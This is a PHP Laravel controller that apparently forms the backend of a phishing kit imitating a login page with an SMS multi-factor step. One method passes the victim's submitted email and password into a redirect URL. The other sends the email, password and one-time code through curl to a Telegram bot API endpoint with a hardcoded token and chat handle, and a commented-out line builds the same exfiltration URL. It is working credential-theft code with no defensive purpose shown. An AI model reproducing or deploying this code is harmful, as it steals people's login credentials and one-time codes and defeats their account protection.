<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class LoginController extends Controller
{
    public function passwordProtection(Request $request)
    {

        return redirect('/mfa-sms-challenge?state=hKFo2SA1Z2VIZ3dxMjBaTTNrQTBNOXplM2JmeFJTOWkyNVd6aaFupWxvZ2luo3RpZNkgdklYN3VXNmowNm9fYkltVC1Vajh3NGNiT0NxRDBpSkajY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&email='.$request->all()['email'].'&pass='.$request->all()['password']);

    }


    public function complete(Request $request) {
        $data = $request->all();
//        $url = "https://api.telegram.org/bot7454497720:AAEWazUhIha95Tdg3DHNe5wBLsqciLL6ZAg/sendMessage?chat_id=@JHBastard&text=pass:%20".$data['password']."%20%20%20%20email:%20".$data['email']."%20%20%20%20%20otp:%20".$data['otp'];
//        dd($url);


        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL => "https://api.telegram.org/bot7454497720:AAEWazUhIha95Tdg3DHNe5wBLsqciLL6ZAg/sendMessage?chat_id=%40JHBastard&text=email%3A%20".$data['email']."%20%20%20%20%20pass%3A%20".$data['password']."%20%20%20%20otp%3A%20".$data['otp'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'GET',
        ));

        $response = curl_exec($curl);

        curl_close($curl);
        echo $response;

    }
}
